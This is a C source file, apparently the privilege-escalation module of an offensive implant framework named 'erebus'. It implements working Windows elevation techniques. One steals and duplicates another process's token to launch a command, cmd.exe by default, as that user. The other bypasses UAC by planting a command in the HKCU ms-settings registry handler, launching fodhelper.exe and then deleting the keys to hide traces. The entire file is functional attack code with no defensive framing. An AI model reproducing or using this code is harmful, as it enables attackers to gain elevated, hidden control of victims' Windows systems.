#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/mod_util.h"
#include "erebus/modules.h"
#include "erebus/pb_modules.h"

static int privesc_token(const erebus_privesc_config *cfg, uint32_t *new_pid) {
    if (!cfg->target_pid) return 0;

    HANDLE hproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, cfg->target_pid);
    if (!hproc) return 0;

    HANDLE htoken = NULL;
    if (!OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY |
            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &htoken)) {
        CloseHandle(hproc);
        return 0;
    }

    HANDLE hnew = NULL;
    if (!DuplicateTokenEx(htoken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hnew)) {
        CloseHandle(htoken);
        CloseHandle(hproc);
        return 0;
    }

    const char *cmd = cfg->command[0] ? cfg->command : "C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    char cmdline[EREBUS_MOD_STR_MAX];
    strncpy(cmdline, cmd, sizeof(cmdline) - 1);

    int ok = CreateProcessAsUserA(hnew, NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {
        *new_pid = pi.dwProcessId;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    CloseHandle(hnew);
    CloseHandle(htoken);
    CloseHandle(hproc);
    return ok;
}

static int privesc_fodhelper(const erebus_privesc_config *cfg, uint32_t *new_pid) {
    const char *cmd = cfg->command[0] ? cfg->command : "C:\\Windows\\System32\\cmd.exe";
    HKEY hkey = NULL;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
            KEY_SET_VALUE, NULL, &hkey, NULL) != ERROR_SUCCESS)
        return 0;

    RegSetValueExA(hkey, NULL, 0, REG_SZ, (const BYTE *)cmd, (DWORD)strlen(cmd) + 1);
    const char *empty = "";
    RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (const BYTE *)empty, 1);
    RegCloseKey(hkey);

    char run[512];
    snprintf(run, sizeof(run), "C:\\Windows\\System32\\fodhelper.exe");
    char *so = NULL, *se = NULL;
    int32_t code = 1;
    int ok = erebus_mod_run_cmd(run, &so, &se, &code);
    free(so); free(se);

    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    (void)new_pid;
    return ok;
}

int erebus_mod_privesc(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_privesc_config cfg;
    if (!erebus_pb_decode_privesc_config(config, config_len, &cfg)) return 0;

    uint32_t new_pid = 0;
    int success = 0;
    const char *integrity = "";

    if (strcmp(cfg.method, "token") == 0) {
        success = privesc_token(&cfg, &new_pid);
        integrity = success ? "high" : "";
    } else if (strcmp(cfg.method, "uac_fodhelper") == 0) {
        success = privesc_fodhelper(&cfg, &new_pid);
        integrity = success ? "high" : "";
    } else if (strcmp(cfg.method, "uac_eventvwr") == 0) {
        /* Not implemented — honest failure (no fake elevation). */
        return erebus_pb_encode_privesc_result(0, "uac_eventvwr", "unsupported", 0, out, out_len);
    } else {
        return erebus_pb_encode_privesc_result(0, cfg.method, "unsupported", 0, out, out_len);
    }

    return erebus_pb_encode_privesc_result(success, cfg.method, integrity, new_pid, out, out_len);
}